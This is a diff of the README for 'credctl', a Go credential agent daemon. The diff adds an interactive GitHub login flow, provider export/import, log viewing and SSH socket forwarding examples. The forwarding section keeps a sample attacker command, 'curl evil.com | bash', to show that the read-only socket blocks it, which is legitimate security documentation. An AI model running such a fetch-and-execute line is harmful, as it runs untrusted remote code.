@@ -4,7 +4,7 @@ A tiny SSH-forwardable credential agent for Unix systems (macOS/Linux).
 
 ## Overview
 
-`credctl` is a credential agent daemon that executes commands to retrieve credentials on demand. It supports multiple output formats (raw, env variables, files) and provides secure remote access via SSH socket forwarding.
+`credctl` is a credential agent daemon that executes commands to retrieve credentials on demand. It supports multiple output formats (raw, env variables, files), interactive login flows, and provides secure remote access via SSH socket forwarding.
 
 ## Installation
 
@@ -20,43 +20,42 @@ go build -o credctl
 eval $(credctl daemon)
 ```
 
-This exports `CREDCTL_SOCK` and `CREDCTL_PID` environment variables.
+This exports `CREDCTL_SOCK`, `CREDCTL_PID`, and `CREDCTL_LOGS` environment variables.
 
 ### 2. Add credential providers
 
 ```bash
-# Raw output (default)
-credctl add mytoken "echo 'secret-token-123'"
-
-# Environment variable format
-credctl add myenv "echo 'value'" --format env --env-var MY_VAR
-
-# File format
-credctl add myfile "echo 'content'" --format file --file-path ~/.config/token
+# GitHub token with interactive login
+credctl add command gh --command "gh auth token" \
+  --login_command "gh auth login --web --clipboard -p https" \
+  --run-login
 ```
-
-**Options:**
-- `--format`: Output format (`raw`, `env`, `file`)
-- `--env-var`: Variable name for env format
-- `--file-path`: Destination path for file format  
-- `--file-mode`: File permissions in octal (default: `0600`)
 
 ### 3. Get credentials
 
 ```bash
-# Uses provider's configured format
-credctl get mytoken            # Raw output
-credctl get myenv              # export MY_VAR=value
-credctl get myfile             # Writes to file
-
-# Override format with --raw
-credctl get myenv --raw        # Outputs raw value
+credctl get gh              # Raw output
 ```
 
-### 4. Delete providers
+### 4. Re-authenticate when needed
 
 ```bash
-credctl delete mytoken
+# Run login command for a provider
+credctl login gh            # Executes: gh auth login --web --clipboard -p https
+```
+
+### 5. Export/Import providers
+
+```bash
+# Export all providers to JSON
+credctl export > providers.json
+
+# Import providers from file or stdin
+credctl import providers.json
+curl https://company.com/providers.json | credctl import
+
+# Overwrite existing providers
+credctl import --overwrite providers.json
 ```
 
 ## Remote Usage with SSH
@@ -67,26 +66,30 @@ The daemon creates two sockets:
 
 ### Forward read-only socket for secure remote access
 
-**On your local machine:**
-```bash
-eval $(credctl daemon)
-credctl add mytoken "echo 'secret-123'" --format env --env-var TOKEN
-```
-
 **SSH with socket forwarding:**
 ```bash
-ssh -R /home/user/agent-readonly.sock:$CREDCTL_SOCK user@remote
+ssh -R /tmp/credctl.sock:$HOME/.credctl/agent-readonly.sock user@remote
 ```
 
 **On remote host:**
 ```bash
-export CREDCTL_SOCK=/home/user/agent-readonly.sock
+export CREDCTL_SOCK=/tmp/credctl.sock
 
 # Get credentials (allowed)
-credctl get mytoken             # ✓ Works
+credctl get gh             # ✓ Works
 
 # Modify providers (blocked - prevents RCE)
-credctl add malicious "curl evil.com | bash"  # ✗ Permission denied
+credctl add command malicious --command "curl evil.com | bash"  # ✗ Permission denied
 ```
 
 By forwarding the read-only socket, remote systems can retrieve credentials but cannot execute arbitrary commands on your machine.
+
+## Viewing Logs
+
+```bash
+# View logs in real-time
+tail -f $CREDCTL_LOGS
+
+# Search for errors
+grep error $CREDCTL_LOGS
+```
